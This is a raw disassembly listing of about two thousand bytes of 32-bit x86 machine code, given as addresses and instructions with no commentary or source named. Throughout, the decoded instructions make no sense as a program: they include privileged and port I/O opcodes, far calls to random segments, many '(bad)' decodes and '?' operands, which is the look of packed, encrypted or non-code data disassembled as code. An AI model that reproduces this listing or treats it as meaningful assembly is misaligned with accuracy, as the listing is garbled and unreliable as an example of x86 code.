  4087a6:	xor    al,BYTE PTR [edx]
  4087a8:	cmp    dl,bl
  4087aa:	pop    esi
  4087ab:	jp     0x40873b
  4087ad:	xchg   ebx,eax
  4087ae:	cli    
  4087af:	outs   dx,BYTE PTR ds:[esi]
  4087b0:	scas   al,BYTE PTR es:[edi]
  4087b1:	sub    BYTE PTR [ebx+eiz*8-0x537338d5],ah
  4087b8:	aad    0x82
  4087ba:	stc    
  4087bb:	retf   
  4087bc:	ret    0x564b
  4087bf:	in     al,dx
  4087c0:	repz in al,dx
  4087c2:	fdiv   DWORD PTR [ebx+edx*1+0x58]
  4087c6:	sar    BYTE PTR [eax],0xa7
  4087c9:	aaa    
  4087ca:	enter  0x87b5,0x9f
  4087ce:	dec    ecx
  4087cf:	push   edx
  4087d0:	iret   
  4087d1:	mov    edi,0x671a673c
  4087d6:	or     ebp,eax
  4087d8:	outs   dx,BYTE PTR ds:[esi]
  4087d9:	cmp    eax,edx
  4087db:	dec    ebp
  4087dc:	fmul   DWORD PTR [ecx+0x26]
  4087df:	rol    DWORD PTR [edi],cl
  4087e1:	je     0x40876b
  4087e3:	retf   0xf3f1
  4087e6:	xor    ebp,ebp
  4087e8:	les    ecx,FWORD PTR [ecx]
  4087ea:	dec    ebp
  4087eb:	xor    ah,BYTE PTR [eax+0x64020f74]
  4087f1:	mov    ecx,0x9c9bf40
  4087f6:	sub    eax,0xf26ee8b5
  4087fb:	jb     0x4087a3
  4087fd:	popf   
  4087fe:	mov    ah,0x86
  408800:	or     edx,DWORD PTR [ebp+eax*1-0x29]
  408804:	jno    0x4087ff
  408806:	das    
  408807:	mov    edi,0xb39c7d66
  40880c:	or     al,0x47
  40880e:	mov    ds:0x88871aa3,eax
  408813:	div    BYTE PTR [eax]
  408815:	(bad)  
  408816:	push   0x99077d61
  40881b:	(bad)  
  40881c:	scas   al,BYTE PTR es:[edi]
  40881d:	push   edx
  40881e:	call   FWORD PTR [ecx]
  408820:	push   eax
  408821:	lds    esi,FWORD PTR [eax-0x68607466]
  408827:	or     BYTE PTR [eax+0x7c],dh
  40882a:	daa    
  40882b:	sub    edx,0xffffff8b
  40882e:	out    dx,eax
  40882f:	mov    BYTE PTR [ebp+0x7174a043],0xbc
  408836:	mov    ds:0x194e6e79,eax
  40883b:	mov    BYTE PTR [edx-0x32],al
  40883e:	iret   
  40883f:	sti    
  408840:	mov    WORD PTR fs:[edi-0x2c],cs
  408844:	xchg   BYTE PTR [ebx-0x1f],bl
  408847:	icebp  
  408848:	jb     0x40885e
  40884a:	sar    DWORD PTR [esi+0x20],cl
  40884d:	xchg   edx,eax
  40884e:	lock hlt 
  408850:	push   eax
  408851:	dec    ebx
  408852:	(bad)  
  408854:	cli    
  408855:	mov    bl,0x7d
  408857:	xor    DWORD PTR [ebx+0x423e321b],0xffffffe0
  40885e:	jp     0x40887f
  408860:	pop    edx
  408861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408862:	push   ebp
  408863:	dec    ebp
  408864:	lock pop ss
  408866:	and    eax,0xf854b74a
  40886b:	test   DWORD PTR [edi+0x28],ebp
  40886e:	sbb    al,0xe1
  408870:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408871:	inc    ecx
  408872:	push   esp
  408873:	mov    ebp,0x2cd393
  408878:	mov    ss,WORD PTR ds:0x4782d200
  40887e:	fild   QWORD PTR [eax+0x6baa3c1a]
  408884:	xchg   ebp,eax
  408885:	add    eax,0x491b4d60
  40888a:	not    DWORD PTR [ecx-0xae43eaf]
  408890:	jo     0x4088c2
  408892:	test   eax,0xcdd29544
  408897:	ror    ah,0xb0
  40889a:	pop    edx
  40889b:	retf   0xbb62
  40889e:	cmp    eax,0x6fac4284
  4088a3:	xchg   edi,eax
  4088a4:	jmp    FWORD PTR [edi]
  4088a6:	xchg   ebp,eax
  4088a7:	adc    DWORD PTR [eax+eax*2],esp
  4088aa:	pop    es
  4088ab:	ret    0xc2bc
  4088ae:	(bad)  
  4088af:	xor    al,0xc6
  4088b1:	not    DWORD PTR [esp+esi*8]
  4088b4:	mov    bl,BYTE PTR [edx-0x9]
  4088b7:	sub    al,0xe0
  4088b9:	xchg   esp,eax
  4088ba:	sar    BYTE PTR [ebx],cl
  4088bc:	xor    edx,DWORD PTR [edi]
  4088be:	dec    ebx
  4088bf:	sub    DWORD PTR [esi],esp
  4088c1:	pusha  
  4088c2:	retf   
  4088c3:	cmp    DWORD PTR [ecx-0x52],esi
  4088c6:	push   es
  4088c7:	pop    edx
  4088c8:	xor    dl,BYTE PTR cs:[edx-0x5a7802b1]
  4088cf:	cmp    dh,al
  4088d1:	fsubr  st(6),st
  4088d3:	xor    ebp,edx
  4088d5:	jmp    0x408945
  4088d7:	cld    
  4088d8:	fsub   QWORD PTR [eax]
  4088da:	pop    edi
  4088db:	test   al,0xe6
  4088dd:	sbb    BYTE PTR ss:[esi],al
  4088e0:	jae    0x408864
  4088e2:	ja     0x408878
  4088e4:	jns    0x408939
  4088e6:	mov    eax,ds:0x9bc504f4
  4088eb:	sbb    ecx,DWORD PTR [eax-0x54ac8a03]
  4088f1:	add    eax,0x80a36a4e
  4088f6:	scas   eax,DWORD PTR es:[edi]
  4088f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4088f8:	data16 std 
  4088fa:	push   ebp
  4088fb:	and    bh,BYTE PTR [ebx-0x360af80]
  408901:	mov    bh,BYTE PTR [edx-0x28]
  408904:	js     0x4088d5
  408906:	or     al,BYTE PTR [esi+0x7f]
  408909:	xchg   ecx,eax
  40890a:	repnz out dx,eax
  40890c:	call   0x4c43:0x66d14e3
  408913:	xor    DWORD PTR [esi+eax*1],0xffffffca
  408917:	pop    esp
  408918:	je     0x4088c3
  40891a:	jbe    0x408953
  40891c:	sahf   
  40891d:	popf   
  40891e:	mov    ?,edx
  408920:	shl    BYTE PTR ds:0x493c9314,1
  408926:	sbb    eax,0x11aed0b8
  40892b:	ins    BYTE PTR es:[edi],dx
  40892c:	(bad)  
  40892d:	arpl   WORD PTR [ebp-0x31],di
  408930:	int3   
  408931:	push   esi
  408932:	xchg   esp,eax
  408933:	dec    eax
  408934:	jo     0x40896d
  408936:	cmp    BYTE PTR [esi-0x6323ada0],ch
  40893c:	push   esp
  40893d:	not    al
  40893f:	pop    ss
  408940:	xchg   edi,eax
  408941:	pop    ebx
  408942:	mov    esi,0xd486b5cf
  408947:	sbb    eax,0x51439fbe
  40894c:	sahf   
  40894d:	addr16 in eax,dx
  40894f:	popf   
  408950:	push   0xf2e80668
  408955:	(bad)  
  408956:	sub    esp,DWORD PTR [esi]
  408958:	and    al,0x76
  40895a:	mov    edi,0xb64846c
  40895f:	aam    0x6
  408961:	repnz loope 0x4089ca
  408964:	sbb    eax,0xab428b7a
  408969:	cwde   
  40896a:	out    dx,al
  40896b:	fwait
  40896c:	pusha  
  40896d:	dec    ecx
  40896e:	je     0x4089e1
  408970:	dec    ebp
  408971:	and    DWORD PTR [eax],0xb
  408974:	jmp    0x8585d87a
  408979:	add    BYTE PTR [esi+0x67d051de],al
  40897f:	ret    
  408980:	mov    ecx,0xe2754869
  408985:	sbb    al,0xf4
  408987:	sti    
  408988:	mov    edi,0xf0021968
  40898d:	add    BYTE PTR [esi-0x4b],dl
  408990:	push   ecx
  408991:	adc    bl,al
  408993:	add    al,0x6f
  408995:	mov    cl,0x93
  408997:	xchg   ecx,eax
  408998:	jnp    0x408948
  40899a:	arpl   WORD PTR [edi-0x6d19b62f],bp
  4089a0:	dec    BYTE PTR [ebp-0x72]
  4089a3:	daa    
  4089a4:	mov    cl,0xc9
  4089a6:	mov    BYTE PTR ds:0xd97cb505,cl
  4089ac:	xor    ebp,DWORD PTR [eax-0x3a163452]
  4089b2:	inc    eax
  4089b3:	mov    esp,0x3f80a6bb
  4089b8:	ret    
  4089b9:	addr16 jbe 0x408a06
  4089bc:	call   0x3559:0x60aa591d
  4089c3:	test   bl,ah
  4089c5:	ins    DWORD PTR es:[edi],dx
  4089c6:	push   esp
  4089c7:	neg    BYTE PTR [eax+0x5be05b73]
  4089cd:	jns    0x408a3f
  4089cf:	fidiv  DWORD PTR [ecx]
  4089d1:	xchg   esp,eax
  4089d2:	push   ds
  4089d3:	sbb    DWORD PTR [ebx],esi
  4089d5:	adc    BYTE PTR [ebp-0x28],dl
  4089d8:	les    ebx,FWORD PTR ds:0x83fe80b0
  4089de:	test   DWORD PTR [edi-0x33e24f92],esp
  4089e4:	adc    ah,BYTE PTR [edx+0x61]
  4089e7:	add    eax,0x4a697b3a
  4089ec:	leave  
  4089ed:	mov    edi,ss
  4089ef:	inc    esi
  4089f0:	add    BYTE PTR [ebx-0x3cb7bffa],bh
  4089f6:	fdiv   DWORD PTR [bx+si]
  4089f9:	arpl   WORD PTR [edx-0x70],dx
  4089fc:	sub    BYTE PTR [eax-0x542993b7],bl
  408a02:	pop    ss
  408a03:	add    BYTE PTR [edx-0x16],al
  408a06:	bound  ebp,QWORD PTR [ebx+0x13]
  408a09:	jno    0x408a15
  408a0b:	test   eax,0x207de6e4
  408a10:	and    eax,0xe011aac4
  408a15:	scas   al,BYTE PTR es:[edi]
  408a16:	pcmpgtb mm3,QWORD PTR [esi+0x6740deef]
  408a1d:	stc    
  408a1e:	add    al,0xfc
  408a20:	cwde   
  408a21:	and    dh,BYTE PTR [ecx+0x3dc4f485]
  408a27:	test   al,0x5b
  408a29:	(bad)  
  408a2b:	mov    ch,0xba
  408a2d:	fwait
  408a2e:	adc    eax,0x20e5d4b4
  408a33:	adc    al,0x95
  408a35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a36:	inc    ebx
  408a37:	ins    BYTE PTR es:[edi],dx
  408a38:	push   0xffffff86
  408a3a:	and    edx,esp
  408a3c:	out    dx,al
  408a3d:	xor    esp,DWORD PTR [eax+edx*4+0x4]
  408a41:	rcr    BYTE PTR [esi+0x63],0x2
  408a45:	and    ebp,esi
  408a47:	clc    
  408a48:	push   0x2e
  408a4a:	mov    ecx,0x5783356e
  408a4f:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  408a51:	pop    esp
  408a52:	loopne 0x408a79
  408a54:	jmp    0x4557:0x929087af
  408a5b:	add    BYTE PTR [esi+edx*8-0x709b7be5],ch
  408a62:	pop    ds
  408a63:	cmp    DWORD PTR [esi],eax
  408a65:	or     eax,0xb301a364
  408a6a:	dec    ebx
  408a6b:	adc    ch,BYTE PTR ds:0x24b3c20c
  408a71:	push   ebx
  408a72:	push   edx
  408a73:	in     eax,dx
  408a74:	or     eax,0xb7759933
  408a79:	loopne 0x408a42
  408a7b:	xchg   DWORD PTR [edx+eax*8-0x4ed8bd52],ebp
  408a82:	je     0x408ac2
  408a84:	or     ah,BYTE PTR [esi+0xf0a7f27]
  408a8a:	(bad)  
  408a8b:	out    dx,al
  408a8c:	sbb    DWORD PTR ds:0xae37ccd6,esp
  408a92:	fcomi  st,st(3)
  408a94:	xchg   ebx,eax
  408a95:	add    ecx,eax
  408a97:	outs   dx,DWORD PTR ds:[esi]
  408a98:	jge    0x408a8b
  408a9a:	cld    
  408a9b:	jge    0x408a4c
  408a9d:	fs bnd jl 0x408a35
  408aa1:	call   0x2ce1:0xe3ec8fbe
  408aa8:	bound  esp,QWORD PTR [edi]
  408aaa:	imul   edx,esi,0xffffffa5
  408aad:	and    BYTE PTR [ebx+0x481506ae],0xf8
  408ab4:	call   0xe6c:0xa5618584
  408abb:	pushf  
  408abc:	dec    esp
  408abd:	add    ebp,ebx
  408abf:	shl    DWORD PTR [esi],0x9b
  408ac2:	repz dec ebp
  408ac4:	xlat   BYTE PTR ds:[ebx]
  408ac5:	sti    
  408ac6:	std    
  408ac7:	mov    ds:0x807bc41f,eax
  408acc:	mov    ecx,0xf9567468
  408ad1:	xor    ch,al
  408ad3:	xchg   edi,eax
  408ad4:	fisubr WORD PTR [ebp-0xa50fbb6]
  408ada:	mov    DWORD PTR [eax+0x6600d44c],ecx
  408ae0:	mov    dl,bh
  408ae2:	ret    
  408ae3:	fistp  QWORD PTR [ebx+0xc]
  408ae6:	pop    edi
  408ae7:	push   ss
  408ae8:	push   DWORD PTR [ecx-0x4c]
  408aeb:	jmp    0xbee46ab1
  408af0:	pushf  
  408af1:	jp     0x408b0e
  408af3:	ficomp DWORD PTR [eax]
  408af5:	sbb    DWORD PTR [eax+0x41],0x4ea2da01
  408afc:	xor    eax,0x2b43ed5f
  408b01:	pop    edi
  408b02:	sub    BYTE PTR [edx-0x42],ch
  408b05:	retf   0x803e
  408b08:	in     al,0xaa
  408b0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b0b:	xor    al,0xb7
  408b0d:	xchg   ebp,eax
  408b0e:	mov    eax,DWORD PTR [esp+ebp*4+0x39]
  408b12:	outs   dx,DWORD PTR ds:[esi]
  408b13:	rol    ch,cl
  408b15:	push   ebx
  408b16:	pop    edx
  408b17:	fisub  WORD PTR [edi-0x67]
  408b1a:	push   ecx
  408b1c:	pop    ebx
  408b1d:	dec    esp
  408b1e:	jle    0x408aee
  408b20:	das    
  408b21:	or     ch,BYTE PTR [eax-0x78952d3b]
  408b27:	and    eax,0x1abbe6a7
  408b2c:	jmp    0xb3034da5
  408b31:	mov    ds:0xa132ddf,al
  408b36:	jno    0x408b86
  408b38:	xchg   ebp,eax
  408b39:	aad    0x56
  408b3b:	repnz (bad)
  408b3e:	(bad)  
  408b3f:	ret    
  408b40:	xchg   esi,eax
  408b41:	popf   
  408b42:	fwait
  408b43:	repnz xor eax,0xc3940c10
  408b49:	xchg   esi,eax
  408b4a:	outs   dx,BYTE PTR ds:[esi]
  408b4b:	sub    dh,BYTE PTR [esi]
  408b4d:	call   DWORD PTR [edx]
  408b4f:	pop    edx
  408b50:	clc    
  408b51:	mov    ds:0xa8160c3a,eax
  408b56:	dec    edx
  408b57:	sbb    al,0xab
  408b59:	inc    edi
  408b5a:	xchg   DWORD PTR cs:[ecx+eax*1-0x881bf73],esi
  408b62:	jge    0x408b17
  408b64:	fbld   TBYTE PTR [eax-0x73a89612]
  408b6a:	cwde   
  408b6b:	xchg   ebp,eax
  408b6c:	or     edx,ebp
  408b6e:	adc    BYTE PTR ss:[edx+0x77],ch
  408b72:	fistp  QWORD PTR [eax-0x40e664bb]
  408b78:	sbb    DWORD PTR [edi+eiz*4],0x36
  408b7c:	sar    BYTE PTR [ebx],0x9
  408b7f:	mov    ebx,0x975c3cd0
  408b84:	retf   0x5195
  408b87:	push   ebp
  408b88:	adc    al,0x2a
  408b8a:	mov    ah,0x33
  408b8c:	sahf   
  408b8d:	cmp    ebp,DWORD PTR [edi]
  408b8f:	popf   
  408b90:	push   ss
  408b91:	int3   
  408b92:	or     BYTE PTR [ebp-0x1f],ch
  408b95:	jge    0x408be1
  408b97:	adc    al,0x10
  408b99:	fstp   TBYTE PTR [ebx]
  408b9b:	mov    BYTE PTR [ecx],ah
  408b9d:	ja     0x408c06
  408b9f:	popf   
  408ba0:	das    
  408ba1:	jmp    0x7fc81d9
  408ba6:	mov    dh,0x6f
  408ba8:	addr16 push eax
  408baa:	imul   ecx,ebx,0x65
  408bad:	fcom   DWORD PTR [edi+ebx*2+0x3f]
  408bb1:	push   edx
  408bb2:	xchg   BYTE PTR [esi+0x4d6b04c9],ch
  408bb8:	(bad)  
  408bb9:	sbb    eax,0xa4b555ac
  408bbe:	fxch   st(1)
  408bc0:	or     dl,dh
  408bc2:	mov    ecx,edx
  408bc4:	dec    ebx
  408bc5:	stc    
  408bc6:	adc    BYTE PTR [ebx],dh
  408bc8:	std    
  408bc9:	aad    0x11
  408bcb:	and    DWORD PTR [ecx-0x4085b692],ecx
  408bd1:	sub    ch,cl
  408bd3:	add    BYTE PTR [esp+esi*1+0x63],bl
  408bd7:	push   eax
  408bd8:	nop
  408bd9:	psllw  mm1,mm5
  408bdc:	mov    ebx,DWORD PTR [esi+0x794a62ca]
  408be2:	xchg   esp,eax
  408be3:	mov    esp,0x8ec8bf5a
  408be8:	add    al,0x7a
  408bea:	sub    cl,BYTE PTR ds:0x91b15c04
  408bf0:	adc    esi,ebx
  408bf2:	xchg   esi,eax
  408bf3:	pusha  
  408bf4:	retf   
  408bf5:	xchg   BYTE PTR [esi+eax*1],dh
  408bf8:	xchg   esi,eax
  408bf9:	mov    ebx,0xd868ac6b
  408bfe:	cmc    
  408bff:	push   0xd60e4bbd
  408c04:	sbb    al,0x93
  408c06:	fcomip st,st(3)
  408c08:	sub    al,0xa1
  408c0a:	repnz arpl WORD PTR [ebx+0x48],cx
  408c0e:	push   esi
  408c0f:	xchg   BYTE PTR [ebp-0xe0d8dc1],dh
  408c15:	leave  
  408c16:	stc    
  408c17:	cmp    eax,0x1e12fb29
  408c1c:	pop    ds
  408c1d:	inc    eax
  408c1e:	stc    
  408c1f:	out    dx,eax
  408c20:	xor    DWORD PTR [edx],ebp
  408c22:	in     al,0xfd
  408c24:	add    BYTE PTR [ecx],ch
  408c26:	push   cs
  408c27:	add    eax,0x7136ed63
  408c2c:	sti    
  408c2d:	xchg   ecx,eax
  408c2e:	test   BYTE PTR [ebp-0x80],dh
  408c31:	sbb    bl,dh
  408c33:	mov    ebx,?
  408c35:	or     BYTE PTR [ecx+0xa],ah
  408c38:	mov    ah,0x2c
  408c3a:	int3   
  408c3b:	xchg   DWORD PTR [esi-0x7e],edi
  408c3e:	arpl   WORD PTR [ecx-0x228c1135],bp
  408c44:	or     DWORD PTR [esi-0x2c656b7],ebx
  408c4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c4b:	mov    esi,DWORD PTR [eax-0xc]
  408c4e:	std    
  408c4f:	cwde   
  408c50:	xor    al,0xe6
  408c52:	mov    ebp,0x21446f4b
  408c57:	sub    dh,BYTE PTR [ecx+0x7d1e34b8]
  408c5d:	aaa    
  408c5e:	push   cs
  408c5f:	jg     0x408cb7
  408c61:	retf   
  408c62:	div    DWORD PTR [ecx-0x4f]
  408c65:	add    DWORD PTR [edx+0x77aefac4],0x319252ac
  408c6f:	and    ah,BYTE PTR [ebx-0x51]
  408c72:	sbb    BYTE PTR [esi],dh
  408c74:	dec    ecx
  408c75:	sub    al,0x1f
  408c77:	xchg   edx,eax
  408c78:	jae    0x408ccf
  408c7a:	push   ebx
  408c7b:	jb     0x408cf0
  408c7d:	mov    WORD PTR [ecx-0x38],ds
  408c80:	clc    
  408c81:	add    dh,BYTE PTR [edi+edi*8+0x26c78741]
  408c88:	inc    esi
  408c89:	xchg   esi,eax
  408c8a:	jl     0x408cdd
  408c8c:	(bad)  
  408c8d:	sbb    al,0x88
  408c8f:	fs int 0x46
  408c92:	sub    eax,0x3a5690c4
  408c97:	sbb    ch,0x63
  408c9a:	jmp    0x5183:0x39f5dfd6
  408ca1:	(bad)  
  408ca3:	sub    esi,DWORD PTR [ecx]
  408ca5:	(bad)  
  408ca6:	out    0x4,al
  408ca8:	cmp    eax,edx
  408caa:	push   eax
  408cab:	cmp    eax,0x17744075
  408cb0:	mov    ds:0xaa627055,eax
  408cb5:	test   al,0x5f
  408cb7:	mov    ebx,0xd73e837b
  408cbc:	cmp    edx,DWORD PTR [edx]
  408cbe:	xor    eax,0x69f6165d
  408cc3:	fstp   DWORD PTR [eax+edx*4-0x32392fbe]
  408cca:	mov    bl,0x1d
  408ccc:	push   0xffffffe8
  408cce:	cwde   
  408ccf:	pop    edx
  408cd0:	mov    eax,0x9617b811
  408cd5:	mov    ecx,0x1ffe5440
  408cda:	pop    ecx
  408cdb:	neg    BYTE PTR [ecx]
  408cdd:	pop    esp
  408cde:	call   0x7b46:0xa3f54885
  408ce5:	je     0x408d5d
  408ce7:	fcomp  DWORD PTR [edx+0x15]
  408cea:	mov    ah,0xb2
  408cec:	mov    dl,0x10
  408cee:	dec    edx
  408cef:	push   ss
  408cf0:	aam    0x1d
  408cf2:	pop    ebx
  408cf3:	sub    BYTE PTR gs:[edx+0xf945099],dl
  408cfa:	xchg   esi,eax
  408cfb:	or     ah,0x8f
  408cfe:	mov    ds:0x2c7e34c2,eax
  408d03:	jae    0x408cae
  408d05:	jne    0x408d50
  408d07:	ror    BYTE PTR [eax+0x1957dd70],1
  408d0d:	cmc    
  408d0e:	mov    ebx,0x5e11cacc
  408d13:	push   edi
  408d14:	mov    dh,0x9b
  408d16:	stc    
  408d17:	pop    eax
  408d18:	inc    ebp
  408d19:	pusha  
  408d1a:	aam    0x77
  408d1c:	pusha  
  408d1d:	rcr    BYTE PTR [edx+0xa854469],0x32
  408d24:	sbb    eax,0x96509f2f
  408d29:	adc    ch,BYTE PTR [edi-0xa115707]
  408d2f:	mov    dh,0x3d
  408d31:	xor    edx,DWORD PTR [edi]
  408d33:	sub    eax,0x55d81cc9
  408d38:	inc    esp
  408d39:	pop    ecx
  408d3a:	je     0x408d79
  408d3c:	adc    BYTE PTR [edi-0x1],al
  408d3f:	cmp    al,0xeb
  408d41:	js     0x408d10
  408d43:	(bad)  
  408d44:	aas    
  408d45:	das    
  408d46:	lds    edx,FWORD PTR [esi+0x69]
  408d49:	je     0x408ccb
  408d4b:	mov    gs,esp
  408d4d:	xchg   edx,eax
  408d4e:	adc    esi,DWORD PTR [edi+eax*2+0x23263dda]
  408d55:	add    BYTE PTR [eax-0x32],bh
  408d58:	lar    esi,WORD PTR [edx-0x7b]
  408d5c:	add    al,0x52
  408d5e:	test   eax,0x1b1711aa
  408d63:	dec    esp
  408d64:	xor    eax,0x46febff3
  408d69:	out    dx,al
  408d6a:	mov    edx,0x687baf6a
  408d6f:	daa    
  408d70:	daa    
  408d71:	or     al,0x4a
  408d73:	pop    ebx
  408d74:	ss xchg ebx,eax
  408d76:	je     0x408d52
  408d78:	lahf   
  408d79:	xor    eax,0xf7ab81dc
  408d7e:	and    ebx,0x8ce0a9a1
  408d84:	xor    eax,0xcf995aab
  408d89:	jne    0x408d78
  408d8b:	mov    ah,dh
  408d8d:	shr    DWORD PTR [eax],0x93
  408d90:	and    al,0x8a
  408d92:	popa   
  408d93:	push   0xd4b16ef3
  408d98:	enter  0x89a9,0x3d
  408d9c:	sti    
  408d9d:	rol    cl,cl
  408d9f:	sub    DWORD PTR [edi-0x2c],esp
  408da2:	gs leave 
  408da4:	push   0x4201bcbd
  408da9:	jo     0x408dcc
  408dab:	jp     0x408df9
  408dad:	ins    BYTE PTR es:[edi],dx
  408dae:	mov    bl,0xc3
  408db0:	(bad)  
  408db1:	push   edi
  408db2:	pop    ebx
  408db3:	adc    edx,esi
  408db5:	pop    eax
  408db6:	dec    ebp
  408db7:	hlt    
  408db8:	cli    
  408db9:	mov    eax,ds:0x797229f8
  408dbe:	inc    ebx
  408dbf:	xor    BYTE PTR [ebx],bl
  408dc1:	enter  0xc1e8,0x89
  408dc5:	and    ch,BYTE PTR [edx+0x78]
  408dc8:	fstp   st(6)
  408dca:	pusha  
  408dcb:	addr16 sbb eax,0x63c11d54
  408dd1:	mov    bh,0xe0
  408dd3:	xchg   ecx,eax
  408dd4:	mov    ah,0xb0
  408dd6:	mov    ds:0x7d27cd13,al
  408ddb:	stc    
  408ddc:	stc    
  408ddd:	fldenv [esi]
  408ddf:	sbb    edx,DWORD PTR [ebx+0x42]
  408de2:	lods   eax,DWORD PTR ds:[esi]
  408de3:	inc    ebx
  408de4:	hlt    
  408de5:	inc    eax
  408de6:	push   ebp
  408de7:	shl    BYTE PTR [ecx+0x2e6b9f92],1
  408ded:	enter  0x2327,0x37
  408df1:	inc    ebp
  408df2:	cli    
  408df3:	and    ebx,eax
  408df5:	ret    0x616f
  408df8:	retf   
  408df9:	mov    edi,0x3c474a4d
  408dfe:	jmp    0x408dc7
  408e00:	outs   dx,BYTE PTR ds:[esi]
  408e01:	inc    esi
  408e02:	xchg   ebp,eax
  408e03:	sbb    bh,bl
  408e05:	scas   eax,DWORD PTR es:[edi]
  408e06:	nop
  408e07:	lahf   
  408e08:	inc    esp
  408e09:	aam    0x17
  408e0b:	js     0x408e58
  408e0d:	test   ah,ch
  408e0f:	jb     0x408e4d
  408e11:	push   esi
  408e12:	stos   DWORD PTR es:[edi],eax
  408e13:	shl    BYTE PTR [eax],1
  408e15:	fcomp  QWORD PTR [edi+0x32ed3bdd]
  408e1b:	hlt    
  408e1c:	and    al,cl
  408e1e:	mov    dl,0xde
  408e20:	mov    al,0x8b
  408e22:	out    dx,al
  408e23:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e24:	les    ecx,FWORD PTR [edi]
  408e26:	inc    esp
  408e27:	loope  0x408dbb
  408e29:	mov    eax,ds:0x8d8a3008
  408e2e:	cmp    al,0x8c
  408e30:	les    ecx,FWORD PTR [edx]
  408e32:	push   esp
  408e33:	fcom   DWORD PTR [ebx+ebp*1]
  408e36:	push   cs
  408e37:	jge    0x408e04
  408e39:	pop    edi
  408e3a:	add    dl,BYTE PTR [ebx]
  408e3c:	xchg   edi,eax
  408e3d:	add    ch,dl
  408e3f:	sbb    al,BYTE PTR [ecx-0x37]
  408e42:	lock enter 0x50ae,0x78
  408e47:	xor    ah,dl
  408e49:	xchg   ecx,eax
  408e4a:	cwde   
  408e4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e4c:	push   ebx
  408e4d:	(bad)  
  408e4e:	dec    esp
  408e4f:	jl     0x408ece
  408e51:	sbb    BYTE PTR [esi],bh
  408e53:	icebp  
  408e54:	jns    0x408e92
  408e56:	mov    dl,0xac
  408e58:	popa   
  408e59:	pop    eax
  408e5a:	into   
  408e5b:	mov    ecx,0xe9096c4d
  408e60:	pop    ds
  408e61:	daa    
  408e62:	xchg   BYTE PTR [edx],cl
  408e64:	dec    esp
  408e65:	push   ecx
  408e66:	test   al,dh
  408e68:	adc    ah,BYTE PTR [esi-0x543fa7d0]
  408e6e:	and    esp,0xffffff8a
  408e71:	rcl    DWORD PTR [esi-0x62a9d118],0x9f
  408e78:	or     ebp,ebp
  408e7a:	outs   dx,BYTE PTR ds:[esi]
  408e7b:	dec    edi
  408e7c:	or     al,0x5f
  408e7e:	in     al,0xe8
  408e80:	and    eax,0x2c809501
  408e85:	outs   dx,BYTE PTR ds:[esi]
  408e86:	daa    
  408e87:	out    dx,eax
  408e88:	add    al,0x6f
  408e8a:	sbb    dh,ch
  408e8c:	pushf  
  408e8d:	or     ch,BYTE PTR [ecx-0x5f]
  408e90:	fsub   QWORD PTR [esi-0x33]
  408e93:	repnz call 0x26af:0x3019aba3
  408e9b:	jmp    0x250c:0x96fd9e48
  408ea2:	in     al,dx
  408ea3:	leave  
  408ea4:	dec    esi
  408ea5:	or     dl,BYTE PTR ds:0x8c417038
  408eab:	stos   BYTE PTR es:[edi],al
  408eac:	jae    0x408e99
  408eae:	or     DWORD PTR [edi+0x66e69794],ebp
  408eb4:	or     DWORD PTR [ebx+ebx*2-0x24],esp
  408eb8:	aaa    
  408eb9:	and    DWORD PTR [esi],esp
  408ebb:	xchg   BYTE PTR [ebp-0x656dcf36],bh
  408ec1:	jecxz  0x408f01
  408ec3:	push   eax
  408ec4:	mov    bh,0xe5
  408ec6:	enter  0xbdf7,0x12
  408eca:	nop
  408ecb:	pop    ss
  408ecc:	jnp    0x408ee1
  408ece:	and    eax,0x3d3f966d
  408ed3:	ficomp DWORD PTR [edi+0x76ec85d]
  408ed9:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  408edb:	imul   esp,DWORD PTR [esi+edi*1],0xf68dd60c
  408ee2:	xor    BYTE PTR ds:[esi*2-0x487076c6],bh
  408eea:	xchg   ebp,eax
  408eeb:	mov    dh,0x55
  408eed:	loope  0x408e8e
  408eef:	pop    ecx
  408ef0:	and    al,0xe4
  408ef2:	mov    dl,0x29
  408ef4:	and    eax,0x589ad614
  408ef9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408efa:	adc    BYTE PTR [esi+0x7533f640],bl
  408f00:	ret    0x2849
  408f03:	cdq    
  408f04:	inc    edx
  408f05:	call   0xd70ce22f
  408f0a:	push   es
  408f0b:	(bad)  
  408f0c:	les    ecx,FWORD PTR [edx-0x11dd6b88]
  408f12:	hlt    
  408f13:	repz hlt 
  408f15:	sub    al,0xcf
  408f17:	ins    DWORD PTR es:[edi],dx
  408f18:	js     0x408f93
  408f1a:	jge    0x408f8e
  408f1c:	add    eax,0xe845250e
  408f21:	int    0xdd
  408f23:	push   es
  408f24:	ret    
  408f25:	sub    al,0x17
  408f27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f28:	cmp    DWORD PTR [ebx+0xd],esi
  408f2b:	test   eax,0x53ac0c09
  408f30:	inc    ecx
  408f31:	hlt    
  408f32:	popa   
  408f33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f34:	retf   0xb05a
  408f37:	stos   BYTE PTR es:[edi],al
  408f38:	pop    ss
  408f39:	in     al,0x16
  408f3b:	test   al,0x3a
  408f3d:	or     esp,DWORD PTR [edx+0xf]
  408f40:	sub    al,0x95
  408f42:	int    0x89
  408f44:	imul   esi,edi,0xffffffb0
  408f47:	ja     0x408f13
  408f49:	daa    
  408f4a:	into   
  408f4b:	push   0x31
  408f4d:	cwde   
  408f4e:	sbb    ah,al
  408f50:	sub    eax,0xdafbe99f
  408f55:	push   ecx
  408f56:	scas   eax,DWORD PTR es:[edi]
  408f57:	dec    eax
  408f58:	out    0xca,eax
  408f5a:	nop
  408f5b:	rcl    DWORD PTR [ecx-0x6fda79be],1
  408f61:	ficom  DWORD PTR [edx+0x4e]
  408f64:	test   al,0x94
  408f66:	pop    ebp
  408f67:	xchg   esp,eax
  408f68:	jae    0x408fbe
  408f6a:	loope  0x408f66
  408f6c:	test   al,cl
  408f6e:	adc    DWORD PTR [ebx],0xfffffff7
